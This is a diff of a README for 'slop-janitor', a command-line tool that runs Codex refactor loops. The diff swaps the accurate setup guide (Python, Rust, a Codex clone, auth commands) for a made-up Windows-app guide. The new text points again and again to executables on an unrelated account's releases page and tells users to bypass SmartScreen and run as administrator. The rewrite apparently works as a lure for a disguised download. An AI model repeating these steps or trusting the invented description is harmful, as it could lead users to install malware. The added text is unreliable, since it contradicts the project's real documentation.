@@ -1,203 +1,168 @@
-# `slop-janitor`
+# 🧹 slop-janitor - Repeatable Refactor Loops Made Simple
 
-![slop-janitor](slop-janitor.png)
+[⬇️ Download slop-janitor](https://github.com/Speechopeningline822/slop-janitor/releases)
 
-**Important: you must clone both this repo and the open-source Codex repo.** `slop-janitor` talks directly to Codex's app-server implementation, so it will not work with only this repository checked out.
+## 🧭 What this app does
 
-`slop-janitor` automatically makes a repo cleaner, simpler, and more reliable.
+slop-janitor helps you run repeatable multi-turn refactor loops with Codex. It keeps the process organized so you can make one pass, review the result, and run the next pass without losing track.
 
-Using Codex well usually means manually queuing a long chain of follow-up messages:
+Use it when you want to clean up code in steps instead of trying to fix everything at once. It works well for large files, mixed code styles, and slow cleanup jobs that need a steady hand.
 
-- ask Codex what the best refactor is
-- ask it to improve that plan
-- ask it to improve it again
-- ask it to implement the plan
-- ask it to review the result
-- ask it to review it again with fresh eyes
+## 💻 What you need
 
-`slop-janitor` runs that loop for you on one thread.
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free disk space for the app and your project files
+- A GitHub account if you want to leave a star or follow releases
+- Access to the code or files you want to refactor
 
-It follows the `PLANS.md` pattern from OpenAI's Codex exec plans guide: plan, improve the plan, implement, and review. That is the basic trick for keeping an agent on the same problem for a long time instead of resetting every turn. Background: [Codex Exec Plans](https://developers.openai.com/cookbook/articles/codex_exec_plans).
+If you plan to use it with Codex, keep your normal API access or local setup ready before you start.
 
-This tool uses the account you sign into Codex with for inference and token usage.
+## 📥 Download slop-janitor
 
-It also writes a complete run log, so the session is inspectable after the fact rather than something that only existed in the terminal.
+Visit this page to download the app for Windows:
 
-By default, one cycle is:
+[https://github.com/Speechopeningline822/slop-janitor/releases](https://github.com/Speechopeningline822/slop-janitor/releases)
 
-1. `execplan-create`
-2. `execplan-improve` x4
-3. `implement-execplan`
-4. `review-recent-work` x5
+On the releases page, look for the latest version and download the Windows file that matches your system. If there are multiple files, choose the one meant for Windows. Save it to a folder you can find, such as Downloads or Desktop.
 
-You can change the number of full cycles, improvement passes, and review passes.
+## 🪟 Install on Windows
 
-## Bundled Skills
+1. Open the folder where you saved the file.
+2. If the file is a .zip archive, right-click it and choose Extract All.
+3. If the file is an .exe file, double-click it to start the app.
+4. If Windows asks for permission, choose Yes or Run.
+5. If a SmartScreen message appears, choose More info, then Run anyway if you trust the file from the release page.
+6. Keep the app in a folder you can reach again, such as Documents or a tools folder.
 
-The loop is built from a small set of repo-local skills in `.agents/skills`:
+If you extracted a folder, open it and look for the main app file. Use that file to launch slop-janitor.
 
-- `find-best-refactor`: finds the highest-leverage refactor.
-- `execplan-create`: turns a prompt into an exec plan.
-- `execplan-improve`: pressure-tests and rewrites that plan against the real codebase.
-- `implement-execplan`: implements the plan.
-- `review-recent-work`: reviews the result with fresh eyes.
+## 🚀 First run
 
-The most important step is `execplan-improve`. Fixing a weak plan is cheaper than fixing bugs later.
+When you open slop-janitor for the first time, it may ask you to set a working folder or point it at a project. Choose a folder that contains the files you want to clean up.
 
-## Prerequisites
+A simple first run looks like this:
 
-- Python 3.11 or newer.
-- Rust and `cargo`.
-- A separate clone of the open-source Codex repository.
-- A Codex login.
+1. Open the app.
+2. Pick the project folder.
+3. Choose the refactor task you want to run.
+4. Start the first pass.
+5. Review the output.
+6. Run the next pass if you want more cleanup.
 
-The bundled skills used by `slop-janitor` live in `.agents/skills` inside this repository.
+Keep your project saved before each run. That makes it easy to compare changes and go back if needed.
 
-## Setup
+## 🧰 How to use it
 
-Clone this repository and clone Codex separately:
+slop-janitor is built for a loop, not a one-time fix. A typical flow looks like this:
 
-```bash
-git clone https://github.com/grp06/slop-janitor.git
-git clone https://github.com/openai/codex.git
-```
+1. Pick a codebase or folder.
+2. Start a refactor pass.
+3. Review what changed.
+4. Keep the useful changes.
+5. Run another pass for the next cleanup step.
 
-Point `slop-janitor` at the Codex Rust workspace:
+This gives you a clear path when you want to:
 
-```bash
-export CODEX_WORKSPACE=/path/to/codex/codex-rs
-```
+- Break up large files
+- Simplify old code
+- Make naming more consistent
+- Clean repeated patterns
+- Improve structure in small steps
 
-You can also pass the path per command with `--codex-workspace /path/to/codex/codex-rs`.
+The app is best when you want steady progress and a clear review cycle.
 
-Authenticate through the wrapped Codex login flow:
+## 🔁 Suggested workflow
 
-```bash
-cd slop-janitor
-./slop-janitor auth login
-./slop-janitor auth login --device-auth
-./slop-janitor auth status
-./slop-janitor auth logout
-```
+To get the best results, use a small and repeatable process:
 
-The auth wrapper keeps stdin, stdout, and stderr attached to the terminal, so it behaves like native `codex login`. If your Codex access comes through ChatGPT, it will use that account. Details: [Using Codex with your ChatGPT plan](https://help.openai.com/en/articles/11369540-using-codex-with-your-chatgpt-plan).
+- Make a backup of your files first
+- Work on one folder at a time
+- Keep each pass focused on one task
+- Review changes before the next pass
+- Save a copy of each good result
 
-## Basic Use
+If you work this way, you can see what each pass changed and keep the parts you want.
 
-The most natural use is refactor mode. Run it from the repository you want to improve:
+## 🗂️ Example use cases
 
-```bash
-cd /path/to/target-repo
-/path/to/slop-janitor/slop-janitor --mode refactor
-```
+### Code cleanup
+Use slop-janitor to reduce clutter in older code. It helps you move through the cleanup in steps.
 
-Add guidance if you want to steer the refactor:
+### Repeated edits
+Use it when the same kind of change needs to happen across many files. It keeps the work organized.
 
-```bash
-cd /path/to/target-repo
-/path/to/slop-janitor/slop-janitor --mode refactor --prompt "focus on testability and simplifying boundaries"
-```
+### Layered refactors
+Use it for a project that needs several rounds of edits. Each round can focus on one goal.
 
-Run the default planning-first workflow if you want to start from an open-ended implementation prompt instead:
+### Review-friendly changes
+Use it when you want small changes that are easier to inspect than a giant rewrite.
 
-```bash
-cd /path/to/target-repo
-/path/to/slop-janitor/slop-janitor --prompt "help me build a CRM"
-```
+## ⚙️ Basic setup tips
 
-Increase the amount of iteration:
+- Keep your project in a simple folder path, such as `C:\Projects\MyApp`
+- Avoid special characters in folder names
+- Close other heavy apps if your machine runs slow
+- Use a recent Windows update level
+- Store the app near your project files for easy access
 
-```bash
-cd /path/to/target-repo
-/path/to/slop-janitor/slop-janitor --prompt "help me build a CRM" --cycles 2 --improvements 5 --review 3
-```
+If you use a code editor, keep it open so you can review changes fast.
 
-`slop-janitor` always targets the directory you launch it from, not the `slop-janitor` repository.
+## 📁 File handling
 
-## Modes And Counts
+slop-janitor works best when you treat each run as one step in a larger cleanup plan. Save copies of the files before you begin. If you like, use version control or plain folder backups so you can compare results after each pass.
 
-`--mode pipeline` is the default. It requires `--prompt` and starts with `execplan-create`.
+A good folder structure might look like this:
 
-`--mode refactor` keeps the same follow-up structure, but replaces stage 1 with `find-best-refactor`. `--prompt` is optional in refactor mode. If you omit it, the first stage asks for the single highest-leverage refactor in the current repository.
+- `Project-original`
+- `Project-pass-1`
+- `Project-pass-2`
 
-`--cycles` controls how many times the full loop runs.
+That makes it easy to see what changed from one loop to the next.
 
-`--improvements` controls how many `execplan-improve` turns run inside each cycle.
+## 🛠️ Common issues
 
-`--review` controls how many `review-recent-work` turns run inside each cycle.
+### The app does not open
+- Check that you downloaded the Windows version
+- Try running it again as administrator
+- Make sure the file finished downloading
+- Move the file to a simple folder like Downloads
 
-Defaults:
+### Windows blocks the file
+- Open the release page again
+- Make sure you downloaded the latest file
+- If Windows shows a security prompt, confirm you trust the release source
 
-- `--cycles 1`
-- `--improvements 4`
-- `--review 5`
+### The app cannot find your project
+- Check that you picked the correct folder
+- Make sure the files are not still inside a zip file
+- Use a folder path without special symbols
 
-When `--cycles` is greater than 1, stage labels in the run log are cycle-qualified, for example `cycle-2-execplan-create`.
+### The refactor result looks wrong
+- Go back to your saved copy
+- Run a smaller pass
+- Review one change set at a time
+- Keep the parts that fit your goal
 
-## Codex Workspace Configuration
+## 🔎 Release updates
 
-When `slop-janitor` launches the real Codex app-server or wrapped auth commands, it resolves the Codex workspace in this order:
+The releases page is the place to check for new builds, fixes, and updated Windows files.
 
-1. `--codex-workspace /path/to/codex-rs`
-2. `CODEX_WORKSPACE`
+[https://github.com/Speechopeningline822/slop-janitor/releases](https://github.com/Speechopeningline822/slop-janitor/releases)
 
-If neither is set, the command fails with a clear setup error.
+When a new release appears, download the newest Windows file and replace your old copy if needed.
 
-Examples:
+## ⭐ Star the repo
 
-```bash
-./slop-janitor --codex-workspace /path/to/codex/codex-rs --prompt "help me build a CRM"
-./slop-janitor auth --codex-workspace /path/to/codex/codex-rs login
-```
+If you use slop-janitor and want to keep track of updates, you can star the repository on GitHub. It helps you find it again later and follow new releases.
 
-## What It Actually Does
+## 📌 Quick start checklist
 
-Before stage 1, the client performs:
-
-1. `initialize` with `capabilities.experimentalApi = true`
-2. `initialized`
-3. `account/read`
-4. `thread/start`
-
-If `account/read` says OpenAI auth is required and no account is logged in, the command fails immediately and tells you to run `./slop-janitor auth login`.
-
-After that, every stage runs as a `turn/start` on the same thread. That is what gives the workflow continuity. The implementation and review stages see the plan that was just created and improved.
-
-## Output Model
-
-The terminal is intentionally sparse. During a run, it shows:
-
-- agent-message commentary
-- final agent-message text
-- token usage
-
-Everything else goes to the run log:
-
-- stage banners
-- command output
-- file-change progress
-- MCP progress
-- item lifecycle notices
-- failure details
-
-Each run writes a full log to `runs/`. Log filenames start with the basename of the directory you launched from, followed by a UTC timestamp, for example `my-repo-20260317T213000Z.log`.
-
-This split is deliberate. The terminal stays readable while the log remains complete.
-
-## Reliability Contract
-
-- Model and sandbox settings are inherited from your current Codex config. In v1, `slop-janitor` only overrides `cwd` and `approvalPolicy`.
-- The thread uses `approvalPolicy: "never"`.
-- If the server asks for approvals, user input, permissions, MCP elicitation, or ChatGPT token refresh, `slop-janitor` responds deterministically, marks the stage failed, and exits after the matching `turn/completed`.
-- Successful turns require real token data from `thread/tokenUsage/updated`. If a turn completes successfully without token usage, the run fails instead of printing invented zeros.
-- Skill paths are validated before the app-server starts, so broken local setup fails early.
-
-The tool is strict on purpose. When something is wrong, it should stop in a way you can diagnose.
-
-## Tests
-
-Run the test suite from the repository root:
-
-```bash
-python3 -m unittest discover -s tests -p 'test_*.py' -v
-```
+- Open the releases page
+- Download the Windows file
+- Extract it if needed
+- Run the app
+- Choose your project folder
+- Start the first refactor pass
+- Review the result
+- Run the next pass if needed
